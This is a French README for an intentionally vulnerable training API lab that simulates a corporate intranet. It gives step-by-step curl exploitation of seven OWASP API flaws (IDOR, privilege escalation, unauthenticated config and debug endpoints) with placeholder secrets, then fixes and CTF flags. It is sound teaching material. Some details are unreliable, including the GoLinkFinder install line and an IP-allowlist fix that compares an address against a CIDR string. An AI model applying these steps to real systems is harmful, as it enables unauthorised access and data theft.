# 💀 nexcorp-portal — Vulnerable API Lab

> **⚠ AVERTISSEMENT — Ce lab est intentionnellement vulnérable. Ne jamais déployer sur un réseau public ou en production.**

---

## Table des matières

1. [Présentation](#présentation)
2. [Structure du projet](#structure-du-projet)
3. [Installation et démarrage](#installation-et-démarrage)
4. [Intégration au projet principal](#intégration-au-projet-principal)
5. [Credentials de test](#credentials-de-test)
6. [Endpoints de l'API](#endpoints-de-lapi)
7. [Exploitation — Guide pas à pas](#exploitation--guide-pas-à-pas)
   - [Reconnaissance avec GoLinkFinder](#1-reconnaissance-avec-golinkfinder)
   - [Interception avec Burp Suite](#2-interception-avec-burp-suite)
   - [VULN-01 — Audit Log sans authentification](#vuln-01--audit-log-sans-authentification-api52023)
   - [VULN-02 — Config endpoint non authentifié](#vuln-02--config-endpoint-non-authentifié-api82023)
   - [VULN-03 — Broken Function Level Auth (élévation de privilèges)](#vuln-03--broken-function-level-auth-api52023)
   - [VULN-04 — Broken Object Level Auth (IDOR sur utilisateurs)](#vuln-04--broken-object-level-auth-idor-api12023)
   - [VULN-05 — Excessive Data Exposure](#vuln-05--excessive-data-exposure-api32023)
   - [VULN-06 — Debug route en production](#vuln-06--debug-route-en-production-api82023)
   - [VULN-07 — Endpoint interne exposé](#vuln-07--endpoint-interne-exposé-api82023)
8. [Reset du lab](#reset-du-lab)
9. [Résumé des vulnérabilités](#résumé-des-vulnérabilités)

---

## Présentation

**nexcorp-portal** simule le portail intranet d'une entreprise fictive, **Nexcorp Systems**. L'application a été conçue pour reproduire des vulnérabilités réelles découvertes lors de tests de pénétration sur des portails corporate — notamment via l'analyse des fichiers JavaScript avec **GoLinkFinder** et l'interception des requêtes avec **Burp Suite**.

### Ce que ce lab simule

- Des endpoints d'administration codés en dur dans le JavaScript frontend, découvrables par scraping
- Des routes API sans middleware d'authentification
- Des vérifications d'autorisation incomplètes (token présent, rôle jamais vérifié)
- Un endpoint de debug laissé actif en production
- Un endpoint interne exposé sans restriction réseau
- Des données sensibles retournées en excès par l'API

### Stack technique

- **Backend** : Python 3.11 + Flask
- **Frontend** : HTML/JS vanilla (portail intranet simulé)
- **Conteneur** : Docker + Docker Compose
- **Base de données** : in-memory (dict Python — pas de persistance)

---

## Structure du projet

```
nexcorp-portal/
├── Dockerfile                  Image Docker (python:3.11-slim)
├── docker-compose.yml          Orchestration standalone + intégration
├── .dockerignore               Exclusions du build
├── README.md                   Ce fichier
└── src/
    ├── app.py                  Application Flask — toutes les routes API
    ├── config.py               Configuration + base de données in-memory
    ├── health.py               Blueprint GET /health
    ├── reset.py                Blueprint POST /reset
    ├── index.html              Frontend du portail (login, dashboard)
    ├── style.css               Thème du portail
    └── requirements.txt        Dépendances Python
```

---

## Installation et démarrage

### Prérequis

- Docker >= 24.x
- Docker Compose >= 2.x

### Lancer le lab

```bash
# Cloner / copier le dossier nexcorp-portal dans votre projet
cd nexcorp-portal

# Build et démarrage
docker compose up -d --build

# Vérifier que le container est up
docker compose ps
docker compose logs -f nexcorp-portal
```

Le portail est accessible sur **http://localhost:5000**

### Arrêter le lab

```bash
docker compose down
```

---

## Intégration au projet principal

Si votre projet possède déjà un `docker-compose.yml` racine, ajoutez simplement le bloc service suivant :

```yaml
  nexcorp-portal:
    build:
      context: ./nexcorp-portal
      dockerfile: Dockerfile
    container_name: nexcorp-portal
    restart: unless-stopped
    ports:
      - "5000:5000"
    environment:
      - SECRET_KEY=dev-secret-change-in-prod
    networks:
      - votre-reseau-projet   # remplacer par le nom de votre réseau
    labels:
      - "lab.service=nexcorp-portal"
      - "lab.vulnerabilities=broken-auth,idor,exposed-admin,excessive-data"
```

Si votre réseau est déjà défini en externe :

```yaml
networks:
  lab-network:
    external: true
    name: votre-reseau-projet
```

---

## Credentials de test

| Utilisateur | Email | Mot de passe | Rôle |
|---|---|---|---|
| Alice Chen | alice.chen@nexcorp.com | admin1234 | admin |
| John Smith | john.smith@nexcorp.com | password123 | employee |
| Bob Kowalski | bob.kowalski@nexcorp.com | bob2024 | employee |
| Sarah Lin | sarah.lin@nexcorp.com | sarah456 | manager |

> Pour les exercices d'exploitation, connectez-vous en tant que **John Smith** (employee). L'objectif est d'accéder à des ressources auxquelles ce rôle ne devrait pas avoir accès.

---

## Endpoints de l'API

### Publics (sans authentification requise)

| Méthode | Endpoint | Description |
|---|---|---|
| GET | `/health` | Health check |
| POST | `/reset` | Réinitialise le lab |
| POST | `/api/v1/auth/login` | Authentification |

### Authentifiés (token requis)

| Méthode | Endpoint | Description |
|---|---|---|
| POST | `/api/v1/auth/logout` | Déconnexion |
| GET | `/api/v1/users/me` | Profil de l'utilisateur courant |
| GET | `/api/v1/dashboard/stats` | Statistiques du dashboard |
| GET | `/api/v1/announcements` | Liste des annonces |
| GET | `/api/v1/tickets` | Tickets de l'utilisateur |
| GET | `/api/v1/employees` | Annuaire employés |
| GET | `/api/v1/employees/:id` | Profil employé par ID |

### Admin — endpoints vulnérables

| Méthode | Endpoint | Auth requise | Vulnérabilité |
|---|---|---|---|
| GET | `/api/v1/admin/users` | Token (rôle ignoré) | Broken Function Level Auth |
| GET | `/api/v1/admin/audit-log` | ❌ Aucune | Missing Authentication |
| GET | `/api/v1/admin/config` | ❌ Aucune | Unauthenticated + secrets exposés |
| POST | `/api/v1/admin/users/promote` | Token (rôle ignoré) | Privilege Escalation |
| GET | `/api/debug/status` | ❌ Aucune | Debug route en production |
| GET | `/api/internal/metrics` | ❌ Aucune | Endpoint interne exposé |

---

## Exploitation — Guide pas à pas

---

### 1. Reconnaissance avec GoLinkFinder

GoLinkFinder scrape les fichiers JavaScript d'une application et en extrait toutes les URLs codées en dur. Le JavaScript du portail contient délibérément des références à tous les endpoints admin et internes.

**Installation**

```bash
go install github.com/GerbenJavado/LinkFinder@latest
# ou via pip
pip install golinkfinder
```

**Scan du lab**

```bash
# Avec le lab démarré sur localhost:5000
GoLinkFinder -d http://localhost:5000 -o endpoints.txt

cat endpoints.txt
```

**Résultat attendu** — GoLinkFinder va extraire entre autres :

```
/api/v1/auth/login
/api/v1/auth/logout
/api/v1/users/me
/api/v1/dashboard/stats
/api/v1/announcements
/api/v1/tickets
/api/v1/employees
/api/v1/admin/users          <-- admin endpoint dans le JS
/api/v1/admin/audit-log      <-- admin endpoint dans le JS
/api/v1/admin/config         <-- admin endpoint dans le JS
/api/v1/admin/users/promote  <-- admin endpoint dans le JS
/api/debug/status            <-- route de debug dans le JS
/api/internal/metrics        <-- endpoint interne dans le JS
```

> Ces URLs sont visibles dans le source JavaScript même si les liens ne sont pas affichés dans l'interface — le navigateur charge le JS, GoLinkFinder le parse.

---

### 2. Interception avec Burp Suite

**Configuration**

1. Ouvrir Burp Suite → **Proxy** → **Options**
2. Ajouter un listener sur `127.0.0.1:8080`
3. Configurer le navigateur pour utiliser le proxy `127.0.0.1:8080`
4. Naviguer sur `http://localhost:5000`
5. Se connecter — la requête `POST /api/v1/auth/login` apparaît dans **HTTP History**

**Récupérer le token**

Dans la réponse de login, copiez la valeur `token` :

```json
{
  "token": "nxc-2-employee",
  "user": { "id": 2, "name": "John Smith", "role": "employee" }
}
```

Ce token sera utilisé dans toutes les requêtes suivantes via le header :

```
Authorization: Bearer nxc-2-employee
```

**Astuce Burp** : clic droit sur la requête de login → **Send to Repeater**. Modifiez et rejouez les requêtes depuis le Repeater pour tester chaque endpoint.

---

### VULN-01 — Audit Log sans authentification (API5:2023)

**Description**

L'endpoint `/api/v1/admin/audit-log` ne possède aucun middleware d'authentification. Il est accessible par n'importe qui, sans token, sans session — directement depuis le navigateur ou curl.

**Exploitation**

```bash
# Aucun token nécessaire
curl http://localhost:5000/api/v1/admin/audit-log
```

**Réponse**

```json
{
  "logs": [
    {"ts": "2024-07-03 09:14", "user": "alice.chen", "action": "LOGIN", "detail": "Login from 10.0.1.12"},
    {"ts": "2024-07-03 09:18", "user": "alice.chen", "action": "CONFIG_EXPORT", "detail": "Exported server config"},
    {"ts": "2024-07-03 10:45", "user": "admin_system", "action": "USER_PROMOTED", "detail": "bob.kowalski promoted"},
    ...
  ]
}
```

**Impact** : un attaquant externe récupère l'historique complet des actions administrateurs, les adresses IP internes, et les noms d'utilisateurs — sans aucune authentification.

**Correction**

```python
# Dans app.py — ajouter AVANT de retourner les données :
@app.route("/api/v1/admin/audit-log")
def audit_log():
    session, err = require_auth()
    if err: return err
    if session["role"] != "admin":
        return jsonify({"error": "Forbidden"}), 403
    return jsonify({"logs": config.AUDIT_LOG})
```

---

### VULN-02 — Config endpoint non authentifié (API8:2023)

**Description**

L'endpoint `/api/v1/admin/config` est accessible sans authentification et retourne la configuration complète du serveur, incluant les credentials de base de données, le secret JWT, le mot de passe SMTP, et les clés AWS.

**Exploitation**

```bash
curl http://localhost:5000/api/v1/admin/config
```

**Réponse**

```json
{
  "config": {
    "env": "production",
    "db_host": "postgres-primary.internal.nexcorp.com",
    "db_user": "nexcorp_app",
    "db_pass": "Nx!Pr0d#2024Secure",
    "jwt_secret": "nxc-jwt-HS256-prod-k3y-d0-n0t-sh4re",
    "smtp_pass": "mail_relay_P@ssw0rd",
    "aws_key_id": "AKIAIOSFODNN7EXAMPLE",
    "aws_secret": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
    "admin_email": "sysadmin@nexcorp.com"
  }
}
```

**Impact** : avec le `jwt_secret`, un attaquant peut forger n'importe quel token JWT et usurper l'identité de n'importe quel utilisateur, y compris les admins. Avec les clés AWS, l'accès à l'infrastructure cloud est total.

**Correction**

```python
# Supprimer l'endpoint en production.
# Si nécessaire, le protéger strictement :
@app.route("/api/v1/admin/config")
def admin_config():
    session, err = require_auth()
    if err: return err
    if session["role"] != "admin":
        return jsonify({"error": "Forbidden"}), 403
    # Ne jamais retourner les secrets — retourner uniquement les clés non sensibles
    safe = {k: v for k, v in config.SERVER_CONFIG.items()
            if k not in ("db_pass", "jwt_secret", "smtp_pass", "aws_secret")}
    return jsonify({"config": safe})
```

---

### VULN-03 — Broken Function Level Auth (API5:2023)

**Description**

L'endpoint `/api/v1/admin/users/promote` vérifie la présence d'un token mais **ne vérifie pas le rôle** de l'utilisateur. N'importe quel employé authentifié peut promouvoir n'importe quel utilisateur au rôle admin.

**Exploitation**

```bash
# Connecté en tant que John Smith (employee)
TOKEN="nxc-2-employee"

# Promotion de John Smith lui-même au rôle admin
curl -X POST http://localhost:5000/api/v1/admin/users/promote \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"userId": 2, "role": "admin"}'
```

**Réponse**

```json
{
  "message": "John Smith promoted: employee → admin",
  "user": {
    "id": 2,
    "name": "John Smith",
    "role": "admin",
    "salary": 85000
  }
}
```

**Impact** : élévation de privilèges complète. Un employé standard obtient les droits admin sans interaction d'un vrai administrateur.

**Via Burp** : intercepter n'importe quelle requête authentifiée → Send to Repeater → changer l'URL vers `/api/v1/admin/users/promote` → modifier le body → Send.

**Correction**

```python
@app.route("/api/v1/admin/users/promote", methods=["POST"])
def promote():
    session, err = require_auth()
    if err: return err
    if session["role"] != "admin":           # <-- ligne manquante
        return jsonify({"error": "Forbidden"}), 403
    ...
```

---

### VULN-04 — Broken Object Level Auth / IDOR (API1:2023)

**Description**

L'endpoint `/api/v1/employees/:id` retourne le profil complet d'un employé par son ID. Le serveur vérifie que l'utilisateur est authentifié mais **ne vérifie pas que l'ID demandé correspond à l'utilisateur connecté**.

**Exploitation**

```bash
TOKEN="nxc-2-employee"   # connecté en tant que John Smith (id=2)

# Accès à son propre profil — normal
curl http://localhost:5000/api/v1/employees/2 \
  -H "Authorization: Bearer $TOKEN"

# Accès au profil de Alice Chen (id=1) — IDOR
curl http://localhost:5000/api/v1/employees/1 \
  -H "Authorization: Bearer $TOKEN"

# Énumération complète
for i in 1 2 3 4; do
  echo "=== User $i ==="
  curl -s http://localhost:5000/api/v1/employees/$i \
    -H "Authorization: Bearer $TOKEN"
done
```

**Réponse pour /employees/1** (alice, admin)

```json
{
  "id": 1,
  "name": "Alice Chen",
  "email": "alice.chen@nexcorp.com",
  "password": "admin1234",
  "role": "admin",
  "dept": "Engineering",
  "salary": 145000,
  "ssn": "123-45-6789",
  "manager_id": null
}
```

**Impact** : accès aux données personnelles de tous les employés (salaires, numéros de sécurité sociale, mots de passe en clair).

**Correction**

```python
@app.route("/api/v1/employees/<int:uid>")
def employee(uid):
    session, err = require_auth()
    if err: return err
    # Autoriser uniquement son propre profil (ou admin voit tout)
    if uid != session["id"] and session["role"] != "admin":
        return jsonify({"error": "Forbidden"}), 403
    u = next((u for u in config.USERS if u["id"] == uid), None)
    if not u:
        return jsonify({"error": "Not found"}), 404
    # Retourner uniquement les champs nécessaires
    return jsonify({"id": u["id"], "name": u["name"], "email": u["email"], "dept": u["dept"]})
```

---

### VULN-05 — Excessive Data Exposure (API3:2023)

**Description**

Même pour les endpoints légitimes, le serveur retourne l'intégralité de l'objet base de données au lieu d'un DTO filtré. Par exemple, `/api/v1/admin/users` retourne les mots de passe, SSN et salaires de tous les utilisateurs.

**Exploitation**

```bash
TOKEN="nxc-2-employee"

# N'importe quel employé authentifié peut appeler cet endpoint
curl http://localhost:5000/api/v1/admin/users \
  -H "Authorization: Bearer $TOKEN"
```

**Réponse**

```json
{
  "users": [
    {"id":1,"name":"Alice Chen","email":"alice.chen@nexcorp.com","password":"admin1234","role":"admin","salary":145000,"ssn":"123-45-6789"},
    {"id":2,"name":"John Smith","email":"john.smith@nexcorp.com","password":"password123","role":"employee","salary":85000,"ssn":"987-65-4321"},
    ...
  ]
}
```

**Impact** : extraction de la base utilisateur complète avec mots de passe en clair, salaires et numéros de sécurité sociale.

**Correction**

Ne jamais retourner l'objet DB directement. Définir une liste explicite de champs autorisés :

```python
SAFE_USER_FIELDS = {"id", "name", "email", "dept", "role"}

return jsonify({
    "users": [{k: u[k] for k in SAFE_USER_FIELDS} for u in config.USERS]
})
```

---

### VULN-06 — Debug route en production (API8:2023)

**Description**

L'endpoint `/api/debug/status` a été créé pendant le développement et n'a jamais été supprimé avant le déploiement en production. Il retourne la configuration complète du serveur ainsi que des métadonnées internes.

**Exploitation**

```bash
# Pas de token nécessaire
curl http://localhost:5000/api/debug/status
```

**Réponse**

```json
{
  "status": "ok",
  "env": "production",
  "debug": true,
  "uptime": "14d 6h 22m",
  "config": {
    "db_pass": "Nx!Pr0d#2024Secure",
    "jwt_secret": "nxc-jwt-HS256-prod-k3y-d0-n0t-sh4re",
    "aws_key_id": "AKIAIOSFODNN7EXAMPLE",
    ...
  }
}
```

**Impact** : identique à VULN-02. Un attaquant qui énumère les chemins courants (`/debug`, `/api/debug`, `/status`) accède à toute la configuration serveur sans authentification.

**Correction**

```python
# Option 1 — supprimer la route complètement en production
# Option 2 — la désactiver via variable d'environnement
@app.route("/api/debug/status")
def debug_status():
    if not config.DEBUG or os.environ.get("FLASK_ENV") == "production":
        return jsonify({"error": "Not found"}), 404
    return jsonify({"status": "ok", "uptime": "..."})
```

---

### VULN-07 — Endpoint interne exposé (API8:2023)

**Description**

L'endpoint `/api/internal/metrics` est destiné à être consommé uniquement par des services internes (monitoring, Prometheus, etc.) et devrait être restreint au niveau réseau. Il est ici accessible depuis n'importe quelle adresse IP.

**Exploitation**

```bash
curl http://localhost:5000/api/internal/metrics
```

**Réponse**

```json
{
  "requests_per_sec": 142,
  "active_sessions": 3,
  "db_connections": 12,
  "memory_mb": 256
}
```

**Impact** : informations sur la charge, le nombre de connexions actives et l'infrastructure — utiles pour un attaquant qui prépare une attaque ciblée.

**Correction**

Restreindre au niveau réseau ou vérifier l'IP source :

```python
@app.route("/api/internal/metrics")
def metrics():
    client_ip = request.remote_addr
    allowed = {"127.0.0.1", "10.0.0.0/8"}  # réseau interne seulement
    if client_ip not in allowed:
        return jsonify({"error": "Not found"}), 404
    return jsonify({...})
```

Ou mieux : exposer cet endpoint sur un port séparé non publié dans Docker.

---

## Reset du lab

Si vous avez modifié des données (promotion d'utilisateurs, etc.), réinitialisez l'état du lab sans redémarrer le container :

```bash
curl -X POST http://localhost:5000/reset
```

```json
{"status": "ok", "message": "Lab reset to default state."}
```
## Flags

Il y a 4 flags cachés dans le lab. Chaque flag nécessite une technique d'exploitation différente pour être trouvé.

| Flag | Emplacement | Comment le trouver |
|---|---|---|
| `DIABLE{h34d3r_hunt3r}` | Header HTTP `X-Flag` | Présent sur **chaque réponse** — visible dans Burp Suite → HTTP History → onglet Response → Headers |
| `DIABLE{n0_auth_n0_problem}` | `GET /api/v1/admin/config` | Aucun token requis : `curl http://localhost:5000/api/v1/admin/config` |
| `DIABLE{d3bug_left_0pen}` | `GET /api/debug/status` | Aucun token requis : `curl http://localhost:5000/api/debug/status` |
| `DIABLE{id0r_is_4_real}` | `GET /api/v1/employees/1` | Se connecter en tant que John Smith (employee) puis requêter l'ID d'un autre utilisateur |

### Ordre de difficulté suggéré

1. **Header** — ouvrir Burp, faire n'importe quelle requête, regarder les headers de réponse
2. **Config** — GoLinkFinder trouve l'endpoint, curl sans token
3. **Debug** — même approche, endpoint moins évident à deviner
4. **IDOR** — nécessite de comprendre que l'ID dans l'URL n'est pas validé côté serveur
---

## Résumé des vulnérabilités

| ID | Endpoint | Authentification | Vulnérabilité | OWASP API Top 10 |
|---|---|---|---|---|
| VULN-01 | `GET /api/v1/admin/audit-log` | ❌ Aucune | Missing authentication | API5:2023 |
| VULN-02 | `GET /api/v1/admin/config` | ❌ Aucune | Secrets exposés sans auth | API8:2023 |
| VULN-03 | `POST /api/v1/admin/users/promote` | ✅ Token | Role non vérifié → escalade | API5:2023 |
| VULN-04 | `GET /api/v1/employees/:id` | ✅ Token | IDOR — accès inter-utilisateurs | API1:2023 |
| VULN-05 | `GET /api/v1/admin/users` | ✅ Token | Role non vérifié + données complètes | API3:2023 |
| VULN-06 | `GET /api/debug/status` | ❌ Aucune | Route de debug en production | API8:2023 |
| VULN-07 | `GET /api/internal/metrics` | ❌ Aucune | Endpoint interne sans restriction réseau | API8:2023 |

---

*Lab développé dans le cadre d'un projet de formation à la sécurité des APIs REST.*